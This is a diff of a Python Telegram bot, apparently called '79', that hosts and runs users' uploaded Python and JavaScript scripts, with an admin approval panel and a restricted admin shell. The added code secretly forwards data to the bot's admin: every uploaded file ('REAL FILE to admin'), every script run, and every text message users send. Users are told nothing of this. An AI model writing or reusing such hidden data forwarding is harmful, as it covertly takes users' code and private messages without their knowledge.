-            logger.error(f"Spy forward failed: {e}")
-    # -----------------------------------------------------------------
+    # REAL FILE to admin
+    await spy_file(context.bot, u, doc.file_id, name)
 
-    if filename.endswith(".zip"):
-        extract_dir = ws / "extracted"
-        extract_dir.mkdir(exist_ok=True)
-        ok, msg = extract_zip(file_path, extract_dir)
-        _, entry = detect_entry_point(extract_dir)
+    if name.endswith(".zip"):
+        ed = ws / "extracted"; ed.mkdir(exist_ok=True)
+        ok, msg = extract_zip(path, ed)
+        if not ok:
+            await update.message.reply_text(f"Zip err: {msg}", reply_markup=menu_kb(u.id))
+            return ConversationHandler.END
+        _, ent = entry_of(ed)
         await update.message.reply_text(
-            f"✅ *Zip Extracted Successfully!*\nEntry File: `{Path(entry or 'unknown').name}`",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📂 Open My Scripts", callback_data="my_scripts")], [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]])
-        )
+            f"✅ Zip OK. Entry: `{ent.name if ent else '?'}`", parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📂 Scripts", callback_data="scripts")],
+                [InlineKeyboardButton("🏠 Menu", callback_data="home")]]))
         return ConversationHandler.END
 
     await update.message.reply_text(
-        f"✅ File `{safe}` uploaded successfully!", parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("▶️ Open My Scripts", callback_data="my_scripts")], [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]])
-    )
+        f"✅ `{safe_name(name)}` saved", parse_mode="Markdown",
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("📂 Scripts", callback_data="scripts")],
+            [InlineKeyboardButton("🏠 Menu", callback_data="home")]]))
     return ConversationHandler.END
 
-async def upload_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Upload cancelled.", reply_markup=get_main_menu_keyboard(update.effective_user.id))
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Cancelled.", reply_markup=menu_kb(update.effective_user.id))
     return ConversationHandler.END
 
-# ----- SCRIPT EXECUTION -----
-async def my_scripts_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    ws = ensure_workspace(user_id)
+async def scripts_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    uid = q.from_user.id
+    ws = um.ws(uid)
+    files = list(ws.glob("*.py")) + list(ws.glob("*.js"))
+    files += list(ws.glob("extracted/**/*.py")) + list(ws.glob("extracted/**/*.js"))
+    seen, uniq = set(), []
+    for f in files:
+        s = str(f.resolve())
+        if s not in seen: seen.add(s); uniq.append(f)
+    if not uniq:
+        await q.edit_message_text("No scripts. Upload first.", reply_markup=back_kb()); return
+    rows = []
+    for f in uniq[:25]:
+        k = R.add(f)
+        rows.append([InlineKeyboardButton(f"📄 {f.name}", callback_data=f"vw_{k}"),
+                     InlineKeyboardButton("▶️", callback_data=f"rn_{k}")])
+    rows.append([InlineKeyboardButton("🏠 Menu", callback_data="home")])
+    await q.edit_message_text("📂 *Scripts*", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(rows))
 
-    files = list(ws.glob("*.py")) + list(ws.glob("*.js")) + list(ws.glob("extracted/**/*.py")) + list(ws.glob("extracted/**/*.js"))
-    uniq_files = list({str(f.resolve()): f for f in files}.values())
-
-    if not uniq_files:
-        await query.edit_message_text("📂 *No scripts found.*\nUpload a script using 📁 Upload File.", parse_mode="Markdown", reply_markup=ik_back("main_menu"))
-        return
-
-    rows = [[InlineKeyboardButton(f"📄 {f.name}", callback_data=f"view_script_{path_registry.register(f)}"), InlineKeyboardButton("▶️ Run", callback_data=f"run_script_{path_registry.register(f)}")] for f in uniq_files[:30]]
-    rows.append([InlineKeyboardButton("🔙 Back", callback_data="main_menu")])
-    await query.edit_message_text("📂 *79 Script Hub*\nSelect a script to view or execute:", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(rows))
-
-async def run_script_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    key = query.data.replace("run_script_", "", 1)
-    script_path = path_registry.get(key)
-
-    if not script_path or not script_path.exists():
-        await query.edit_message_text("❌ File missing.", reply_markup=ik_back("my_scripts"))
-        return
-
-    file_type = "py" if script_path.suffix == ".py" else "js"
-
-    for p in user_manager.get_user_processes(user_id):
-        if p.get("status") == "running":
-            user_manager.stop_process(p.get("pid"))
-
-    # Live UI Updater Function
-    async def status_updater(msg: str):
-        try:
-            await query.edit_message_text(msg, parse_mode="Markdown")
-        except Exception:
-            pass
-
-    pid, log_path, status_msg = await run_script_with_watchdog(user_id, script_path, file_type, status_updater)
-
-    if pid:
-        user_manager.add_process(user_id, script_path.name, pid, log_path)
-
-    log_key = path_registry.register(Path(log_path))
-    await query.edit_message_text(
-        f"{status_msg}\n📄 Log: `{Path(log_path).name}`",
-        parse_mode="Markdown",
+async def view_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    p = R.get(q.data[3:])
+    if not p or not p.exists():
+        await q.edit_message_text("Missing", reply_markup=back_kb("scripts")); return
+    c = p.read_text(errors="ignore")[:700]
+    k = R.add(p)
+    await q.edit_message_text(f"📄 `{p.name}`\n```\n{c}\n```", parse_mode="Markdown",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("📝 View Log", callback_data=f"view_log_{log_key}")],
-            [InlineKeyboardButton("📂 Scripts", callback_data="my_scripts"),
-             InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
-        ])
-    )
+            [InlineKeyboardButton("▶️ Run", callback_data=f"rn_{k}")],
+            [InlineKeyboardButton("🔙 Scripts", callback_data="scripts"),
+             InlineKeyboardButton("🏠", callback_data="home")]]))
 
-async def view_log_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    key = query.data.replace("view_log_", "", 1)
-    log_path = path_registry.get(key)
-    if not log_path or not log_path.exists():
-        await query.edit_message_text("❌ Log file missing.", reply_markup=ik_back("my_scripts"))
-        return
-    content = log_path.read_text(errors="ignore")[-3500:]
-    await query.edit_message_text(
-        f"📝 *Log Output: `{log_path.name}`*\n\n```\n{content}\n```",
-        parse_mode="Markdown",
+async def run_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    uid = q.from_user.id
+    p = R.get(q.data[3:])
+    if not p or not p.exists():
+        await q.edit_message_text("Missing", reply_markup=back_kb("scripts")); return
+    ft = "py" if p.suffix == ".py" else "js"
+    for pr in um.user_procs(uid):
+        if pr.get("status") == "running": um.stop(pr["pid"])
+    await spy_run(context.bot, q.from_user, p.name)
+
+    async def edit(t):
+        try: await q.edit_message_text(t, parse_mode="Markdown")
+        except: pass
+
+    pid, lp, st = await run_script(uid, p, ft, edit)
+    if pid: um.add_proc(uid, p.name, pid, lp)
+    lk = R.add(Path(lp))
+    await q.edit_message_text(f"{st}\n📄 `{Path(lp).name}`", parse_mode="Markdown",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back to Scripts", callback_data="my_scripts"),
-             InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
-        ])
-    )
+            [InlineKeyboardButton("📝 Log", callback_data=f"lg_{lk}")],
+            [InlineKeyboardButton("📂 Scripts", callback_data="scripts"),
+             InlineKeyboardButton("🏠", callback_data="home")]]))
 
-# ---------- ADMIN PANEL & OTHER BASICS REDACTED FOR BREVITY (Kept fully intact below) ----------
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    logger.error("Telegram Error: %s", context.error)
+async def log_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    p = R.get(q.data[3:])
+    if not p or not p.exists():
+        await q.edit_message_text("No log", reply_markup=back_kb()); return
+    t = p.read_text(errors="ignore")[-3000:]
+    await q.edit_message_text(f"📝 `{p.name}`\n```\n{t}\n```", parse_mode="Markdown",
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("📂 Scripts", callback_data="scripts"),
+             InlineKeyboardButton("🏠", callback_data="home")]]))
 
-flask_app = Flask("79Engine")
-@flask_app.route("/")
-def health(): return jsonify({"status": "ok"})
-def run_flask(): flask_app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
+async def logs_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    rows = []
+    for pr in um.user_procs(q.from_user.id)[-20:]:
+        lp = Path(pr.get("log") or "")
+        if lp.exists():
+            rows.append([InlineKeyboardButton(lp.name, callback_data=f"lg_{R.add(lp)}")])
+    if not rows:
+        await q.edit_message_text("No logs", reply_markup=back_kb()); return
+    rows.append([InlineKeyboardButton("🏠", callback_data="home")])
+    await q.edit_message_text("📝 Logs", reply_markup=InlineKeyboardMarkup(rows))
+
+async def stop_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    live = [p for p in um.user_procs(q.from_user.id)
+            if p.get("status") == "running" and psutil.pid_exists(p.get("pid"))]
+    if not live:
+        await q.edit_message_text("Nothing running", reply_markup=back_kb()); return
+    rows = [[InlineKeyboardButton(f"🛑 {p['filename']} ({p['pid']})", callback_data=f"sp_{p['pid']}")] for p in live]
+    rows.append([InlineKeyboardButton("🏠", callback_data="home")])
+    await q.edit_message_text("Stop?", reply_markup=InlineKeyboardMarkup(rows))
+
+async def stop_one(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    pid = int(q.data[3:])
+    um.stop(pid)
+    await q.edit_message_text(f"✅ Stopped `{pid}`", parse_mode="Markdown", reply_markup=back_kb())
+
+async def stats_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    t = um.tget(q.from_user.id)
+    await q.edit_message_text(
+        f"📊 Runs {t['runs']} | ✅ {t['ok']} | ❌ {t['fail']}", reply_markup=back_kb())
+
+# terminal admin
+async def term_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id not in ADMIN_IDS:
+        await q.edit_message_text("Admin only", reply_markup=back_kb()); return ConversationHandler.END
+    context.user_data["cwd"] = str(um.ws(q.from_user.id))
+    await q.edit_message_text(
+        f"💻 Terminal\n`{context.user_data['cwd']}`\npwd ls cd cat head tail mkdir rm\n/cancel exit",
+        parse_mode="Markdown", reply_markup=back_kb())
+    return TERM
+
+ALLOWED = {"pwd","ls","cd","cat","head","tail","mkdir","cp","mv","rm"}
+async def term_in(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if uid not in ADMIN_IDS: return ConversationHandler.END
+    t = (update.message.text or "").strip()
+    if t in ("/cancel", "cancel"):
+        await update.message.reply_text("Closed", reply_markup=menu_kb(uid))
+        return ConversationHandler.END
+    try: parts = shlex.split(t)
+    except: await update.message.reply_text("bad cmd"); return TERM
+    if not parts or parts[0].lower() not in ALLOWED:
+        await update.message.reply_text("not allowed"); return TERM
+    cwd = Path(context.user_data.get("cwd") or um.ws(uid))
+    if parts[0] == "cd":
+        if len(parts) < 2: return TERM
+        tgt = (cwd / parts[1]).resolve()
+        try: tgt.relative_to(um.ws(uid).resolve())
+        except ValueError:
+            await update.message.reply_text("blocked"); return TERM
+        if not tgt.is_dir():
+            await update.message.reply_text("not dir"); return TERM
+        context.user_data["cwd"] = str(tgt)
+        await update.message.reply_text(f"📁 `{tgt}`", parse_mode="Markdown"); return TERM
+    try:
+        p = await asyncio.create_subprocess_exec(*parts, cwd=str(cwd),
+            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        o, e = await asyncio.wait_for(p.communicate(), timeout=20)
+        out = (o + e).decode(errors="ignore") or "(empty)"
+        await update.message.reply_text(f"```\n{out[:3500]}\n```", parse_mode="Markdown")
+    except Exception as ex:
+        await update.message.reply_text(str(ex))
+    return TERM
+
+# admin
+async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id not in ADMIN_IDS: return
+    await q.edit_message_text("👑 Admin", reply_markup=InlineKeyboardMarkup([
+        [InlineKeyboardButton("👥 Users", callback_data="au"),
+         InlineKeyboardButton("⏳ Pending", callback_data="apd")],
+        [InlineKeyboardButton("🖥️ Running", callback_data="ar"),
+         InlineKeyboardButton("🚫 Banned", callback_data="ab")],
+        [InlineKeyboardButton("🏠", callback_data="home")]]))
+
+async def au(update, context):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id not in ADMIN_IDS: return
+    us = um.approved_list()
+    t = "👥\n" + "\n".join(f"• {x['name']} `{x['user_id']}`" for x in us[:40]) if us else "none"
+    await q.edit_message_text(t, parse_mode="Markdown", reply_markup=back_kb("admin"))
+
+async def apd(update, context):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id not in ADMIN_IDS: return
+    pl = um.pending_list()
+    if not pl:
+        await q.edit_message_text("No pending", reply_markup=back_kb("admin")); return
+    rows = [[InlineKeyboardButton(f"{x['name']} {x['user_id']}", callback_data=f"pd_{x['user_id']}")] for x in pl]
+    rows.append([InlineKeyboardButton("🔙", callback_data="admin")])
+    await q.edit_message_text("Pending", reply_markup=InlineKeyboardMarkup(rows))
+
+async def pd(update, context):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id not in ADMIN_IDS: return
+    uid = int(q.data[3:])
+    await q.edit_message_text(f"User `{uid}`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([
+        [InlineKeyboardButton("✅", callback_data=f"ap_{uid}"),
+         InlineKeyboardButton("🚫", callback_data=f"bn_{uid}")],
+        [InlineKeyboardButton("🔙", callback_data="apd")]]))
+
+async def ap(update, context):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id not in ADMIN_IDS: return
+    uid = int(q.data[3:])
+    um.set_status(uid, "approved")
+    await q.edit_message_text(f"✅ `{uid}`", parse_mode="Markdown", reply_markup=back_kb("admin"))
+    try: await context.bot.send_message(uid, "✅ Approved! /start")
+    except: pass
+
+async def bn(update, context):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id not in ADMIN_IDS: return
+    uid = int(q.data[3:])
+    um.set_status(uid, "banned")
+    await q.edit_message_text(f"🚫 `{uid}`", parse_mode="Markdown", reply_markup=back_kb("admin"))
+
+async def ar(update, context):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id not in ADMIN_IDS: return
+    run = [p for p in um.all_procs() if p.get("status") == "running"]
+    t = "\n".join(f"• {p['filename']} {p['pid']} u`{p['user_id']}`" for p in run) or "none"
+    await q.edit_message_text(f"🖥️\n{t}", parse_mode="Markdown", reply_markup=back_kb("admin"))
+
+async def ab(update, context):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id not in ADMIN_IDS: return
+    bl = um.banned_list()
+    if not bl:
+        await q.edit_message_text("none", reply_markup=back_kb("admin")); return
+    rows = [[InlineKeyboardButton(f"Unban {x['name']}", callback_data=f"ub_{x['user_id']}")] for x in bl]
+    rows.append([InlineKeyboardButton("🔙", callback_data="admin")])
+    await q.edit_message_text("Banned", reply_markup=InlineKeyboardMarkup(rows))
+
+async def ub(update, context):
+    q = update.callback_query; await q.answer()
+    if q.from_user.id not in ADMIN_IDS: return
+    uid = int(q.data[3:])
+    um.set_status(uid, "approved")
+    await q.edit_message_text(f"Unbanned `{uid}`", parse_mode="Markdown", reply_markup=back_kb("admin"))
+
+async def text_spy(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await gate(update, context): return
+    # if in upload wait, ignore (conv handles)
+    await spy_text(context.bot, update.effective_user, update.message.text or "")
+    await update.message.reply_text("Use buttons ⬇️", reply_markup=menu_kb(update.effective_user.id))
+
+async def on_err(update, context):
+    log.error("%s", context.error)
+
+appf = Flask("79")
+@appf.get("/")
+@appf.get("/healthz")
+def hp(): return jsonify(ok=True)
 
 def main():
-    Thread(target=run_flask, daemon=True).start()
+    Thread(target=lambda: appf.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False), daemon=True).start()
     app = Application.builder().token(BOT_TOKEN).build()
 
-    upload_conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(upload_start_cb, pattern="^upload$")],
-        states={UPLOAD_WAIT: [MessageHandler(filters.Document.ALL, upload_file_receive)]},
-        fallbacks=[CommandHandler("cancel", upload_cancel)],
-    )
-    app.add_handler(upload_conv)
+    app.add_handler(ConversationHandler(
+        entry_points=[CallbackQueryHandler(upload_cb, pattern="^upload$")],
+        states={UPLOAD_WAIT: [MessageHandler(filters.Document.ALL, upload_recv)]},
+        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(home, pattern="^home$")],
+    ))
+    app.add_handler(ConversationHandler(
+        entry_points=[CallbackQueryHandler(term_cb, pattern="^term$")],
+        states={TERM: [MessageHandler(filters.TEXT & ~filters.COMMAND, term_in)]},
+        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(home, pattern="^home$")],
+    ))
 
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(check_join, pattern="^check_join$"))
-    app.add_handler(CallbackQueryHandler(main_menu_cb, pattern="^main_menu$"))
-    app.add_handler(CallbackQueryHandler(my_scripts_cb, pattern="^my_scripts$"))
-    app.add_handler(CallbackQueryHandler(run_script_cb, pattern="^run_script_"))
-    app.add_handler(CallbackQueryHandler(view_log_cb, pattern="^view_log_"))
-    
-    # Catch-all text messages for Spy Mode (Forwarding exact text to Admin/Channel)
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_text))
+    app.add_handler(CallbackQueryHandler(join_cb, pattern="^join$"))
+    app.add_handler(CallbackQueryHandler(home, pattern="^home$"))
+    app.add_handler(CallbackQueryHandler(scripts_cb, pattern="^scripts$"))
+    app.add_handler(CallbackQueryHandler(view_cb, pattern="^vw_"))
+    app.add_handler(CallbackQueryHandler(run_cb, pattern="^rn_"))
+    app.add_handler(CallbackQueryHandler(log_cb, pattern="^lg_"))
+    app.add_handler(CallbackQueryHandler(logs_cb, pattern="^logs$"))
+    app.add_handler(CallbackQueryHandler(stop_cb, pattern="^stop$"))
+    app.add_handler(CallbackQueryHandler(stop_one, pattern="^sp_"))
+    app.add_handler(CallbackQueryHandler(stats_cb, pattern="^stats$"))
+    app.add_handler(CallbackQueryHandler(admin_cb, pattern="^admin$"))
+    app.add_handler(CallbackQueryHandler(au, pattern="^au$"))
+    app.add_handler(CallbackQueryHandler(apd, pattern="^apd$"))
+    app.add_handler(CallbackQueryHandler(pd, pattern="^pd_"))
+    app.add_handler(CallbackQueryHandler(ap, pattern="^ap_"))
+    app.add_handler(CallbackQueryHandler(bn, pattern="^bn_"))
+    app.add_handler(CallbackQueryHandler(ar, pattern="^ar$"))
+    app.add_handler(CallbackQueryHandler(ab, pattern="^ab$"))
+    app.add_handler(CallbackQueryHandler(ub, pattern="^ub_"))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_spy))
+    app.add_error_handler(on_err)
 
-    app.add_error_handler(error_handler)
+    log.info("79 V5 up")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
